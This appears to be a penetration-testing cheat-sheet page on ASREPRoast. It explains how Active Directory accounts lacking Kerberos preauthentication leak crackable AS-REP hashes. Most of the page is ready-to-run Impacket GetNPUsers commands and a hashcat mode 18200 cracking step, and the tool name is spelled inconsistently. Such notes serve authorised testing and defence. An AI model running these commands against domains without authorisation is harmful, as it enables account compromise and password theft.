# ASREPRoast

{% hint style="info" %}
**In case of last resort.**&#x20;

**PS: This attack could be used in a post-compromise scenario but also in the initial attack vectors ;)**
{% endhint %}

## Brief

> ASREPRoast is about **retrieving crackable hashes** from **KRB5 AS-REP responses** for users **without kerberoast preauthentication** enabled.&#x20;
>
> This isn’t as useful as Kerberoasting, as accounts have to have _DONT\_REQ\_PREAUTH()_ explicitly set for them to be vulnerable and you’re still reliant upon weak password complexity for the attack to work. But who knows, might be the only weak point you need.&#x20;
>
> Now, if you can enumerate accounts in a Windows domain that don’t require Kerberos preauthentication, you can easily request a piece of encrypted information for said accounts and efficiently crack the material offline, revealing the user’s password.&#x20;
>
> **To do that you need to :**

1. Send the **KRB\_AS\_REQ** to get the **KRB\_AS\_REP** with the encrypted information, to do so :
   1. If you have username :
      1. `GetNPUser.py $domain/$username -no-pass -dc-ip $ip -request`
   2. If you have no username :
      1. `GetNPUser.py $domain/ -no-pass -dc-ip $ip -request`
2. Crack hashes :
   1. `hashcat -m 18200 ticket wordlist`

```bash
# MISC of commands
# list of users in users file
for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip $ip $domain/${user} | grep -v Impacket; done

GetNPUsers.py -dc-ip $ip -request $domain/

GetNPUsers.py -dc-ip $ip -request $domain/ -format hashcat/john

GetNPUsers.py -dc-ip $ip -usersfile users.txt $domain/

GetNPUsers.py $domain/backup -no-pass

GetNPUsers.py -no-pass $domain/ -usersfile users.txt -format hashcat -outputfile hashes.txt
```
